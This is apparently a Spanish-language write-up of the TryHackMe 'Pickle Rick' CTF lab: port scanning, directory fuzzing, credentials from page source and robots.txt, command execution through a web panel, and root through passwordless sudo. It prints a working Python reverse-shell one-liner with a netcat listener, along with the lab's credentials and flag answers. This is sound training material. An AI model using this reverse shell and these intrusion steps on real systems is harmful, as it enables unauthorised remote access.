---
title: Pickle Rick
date: 2025-11-15 17:51:00 +/-TTTT
categories: [Máquinas Tryhackme,easy]
tags: [CTF,tryhackme]     # TAG names should always be lowercase
image:
    path: /assets/img/headers/portada_rick.webp
    lqip: data:image/UklGRogAAABXRUJQVlA4IHwAAADwAwCdASoUAAsAPzmEuVOvKKWisAgB4CcJbACdMoABVf8Lky2C0KUAAP21xaHrnPKZi2SdDfMvwqlral5kvcVWozleUSCk6uY427i0lsjVJmg+BqoRz2H5GWMkko3dd8qE2T6unEXx7iin8eCEK2qeLnBnI7IaYfR8DIAA
description: Resolución de la máquina Pickle Rick
---

## Descripción

Máquina de nivel "easy" que sirve más que nada para practicar conceptos básicos. Máquina muy divertida y didáctica!
Rick se convirtió en un Pepinillo, pero necesita unos ingredientes para poder regresar a su forma humana. Ayudemos a Rick a conseguir los 3 ingredientes para que pueda hacer su poción. Manos a la obra!

### Escaneo de puertos

Lo primero que haremos es un escaneo de los puertos, donde nos encontramos 2 servicios abiertos: 22 (SSH) y 80 (HTTP)

![img-description](/assets/img/pickle_rick/nmap.png)

### Incursionando en el puerto 80

Veremos que nos entrega el puerto 80 para ver si nos entrega mas información, ya que, al no tener credenciales no podremos acceder al servicio SSH.
Vemos que hay una página que a simple vista no nos entrega mucha información

![img-description](/assets/img/pickle_rick/http.png)

Podríamos ver el código fuente de la página, donde se ve que hay escrito un usuario: "R1ckRul3s"

![img-description](/assets/img/pickle_rick/fuente.png)

Además podemos ver un directorio interesante llamado "assets" por lo que podriamos hacer fuzzing de directorios por si encontramos algo más

Esto se puede hacer de varias formas, con herramientas como dirb, gobuster, incluso con nmap y varias herramientas más.

Probaremos 2 formas, primero con nmap, donde encontramos 2 directorios, "login" y "robots.txt"

![img-description](/assets/img/pickle_rick/nmapenum.png)

Luego probando con dirb podemos apreciar que a parte de los directorios ya encontrados con nmap tenemos un directorio llamado portal.php.Por lo que tendriamos los siguientes directorios descubiertos: /robots.txt, /assets, /login.php y /portal.php

![img-description](/assets/img/pickle_rick/dirb.png)

Al ingresar a /robots.txt nos encontramos con un texto que pareciera ser una password: "Wubbalubbadubdub"

![img-description](/assets/img/pickle_rick/robots.png)

Teniendo un usuario: "R1ckRul3s" y un password: "Wubbalubbadubdub", podríamos intentar ingresar por SSH con estas credenciales. Pero no tenemos los permisos para conectarnos

![img-description](/assets/img/pickle_rick/ssh.png)

Sigamos revisando los directorios descubiertos, en /assets podemos ver varios archivos pero uno interesante es el "portal.jpg" que nos da a entender que podría haber un portal de login y esto puede ser posible ya que tambien encontramos directorios con nombre "login.php" y portal.php"

![img-description](/assets/img/pickle_rick/assets.png)

Veamos el directorio "portal.php"...oooh tenemos un portal que nos pide usuario y contraseña, que les parece si ocupamos las credenciales que ya tenemos?

![img-description](/assets/img/pickle_rick/login.png)

Y que tenemos acá!! un command panel donde posiblemente podamos meter comandos


![img-description](/assets/img/pickle_rick/panel.png)

Veamos, si podemos ingresar comandos como "whoami". Interesante, nos dice que somos "www-data"

![img-description](/assets/img/pickle_rick/whoami.png)

Probemos con "ls" para listar el directorio donde nos encontramos. Vaya! acá nos encontramos con varios archivos, ente ellos "Sup3rS3cretPickl3Ingred.txt" y "clue.txt"

![img-description](/assets/img/pickle_rick/ls.png)

Probaremos "cat" para que nos imprima el contenido de "Sup3rS3cretPickl3Ingred.txt". Vaya parece que no tenemos permisos de ocupar "cat"

![img-description](/assets/img/pickle_rick/cat.png)

![img-description](/assets/img/pickle_rick/cat_error.png)

Veremos si con "less" podemos acceder al contenido de "Sup3rS3cretPickl3Ingred.txt". Si funciona y ya tenemos el primer ingrediente que necesita Rick para su poción: "mr. meeseek hair"

![img-description](/assets/img/pickle_rick/less.png)

![img-description](/assets/img/pickle_rick/primeringr.png)

Veamos ahora el contenido de "clue.txt". Es una pista! y dice: "Look around the file system for the other ingredient." Entonces tendremos que buscar el otro ingrediente por los archivos del sistema

![img-description](/assets/img/pickle_rick/clue_less.png)

![img-description](/assets/img/pickle_rick/clue_pista.png)

Para poder movernos entre directorios de forma comoda dentro del sistema se me ocurre ver si me puedo conectar a través de netcat ocupando una revshell. Lo primero que quiero ver es si tiene instalado python3.

![img-description](/assets/img/pickle_rick/which.png)

Y como se puede apreciar si lo tiene instalado

![img-description](/assets/img/pickle_rick/python.png)

Ocuparé la siguiente revshell

```terminal
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Tú IP",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

 (*no te olvides de colocar tú IP donde dice "Tú IP")

Y estaremos a la escucha con  nc -lvnp 9001

![img-description](/assets/img/pickle_rick/revpython.png)

![img-description](/assets/img/pickle_rick/nc.png)

Y estamos dentro!

![img-description](/assets/img/pickle_rick/dentro.png)

Ahora que podemos movernos mas comodamente podemos ver que en el directorio /home tenemos 2 directorios y posibles usuarios "rick" y "ubuntu", pero el directorio "rick" tiene permisos de lectura, escritura y ejecución solo para el usuario root y el grupo root. Por lo tanto no podemos tener acceso

![img-description](/assets/img/pickle_rick/permisos.png)

Tendremos que escalar privilegios para poder acceder a ese directorio. Primero veremos los permisos que tenemos con sudo para el usuario que estamos ocupando, esto lo hacemos con "sudo -l". Y que sorpresa! tenemos acceso al comando sudo sin contraseña. por lo tanto podriamos escalar privilegios al root con el comando "sudo su" y con whoami podemos ver que ya somos root!

![img-description](/assets/img/pickle_rick/sudo-l.png)

![img-description](/assets/img/pickle_rick/root.png)

Ahora veremos el contenido del directorio "rick". Y ahí está el segundo ingrediente que necesita Rick: "1 jerry tear". Solo nos falta uno que lo mas probable esté en el directorio root

![img-description](/assets/img/pickle_rick/2ingr.png)

Nos movemos al directorio root y podemos encontrar el tercer y último ingrediente: "fleeb juice"

![img-description](/assets/img/pickle_rick/3ingr.png)

## Lo hemos conseguido!!

Hemos podido conseguir todos los ingredientes para ayudar a Rick!!
Acá finalizamos esta aventura con Rick en esta entretenida máquina.














